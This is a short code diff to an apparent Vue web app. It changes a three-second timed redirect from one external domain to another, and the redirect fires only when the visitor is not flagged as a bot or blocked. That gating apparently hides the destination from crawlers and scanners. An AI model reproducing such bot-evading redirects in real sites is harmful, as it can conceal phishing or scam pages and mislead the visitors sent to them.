@@ -56,7 +56,7 @@ const app = createApp({
       
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://tobbs.kanacad.org/';
+          window.location.href = 'https://pov.evomonitor.com/';
         }, 3000);
       }
     });
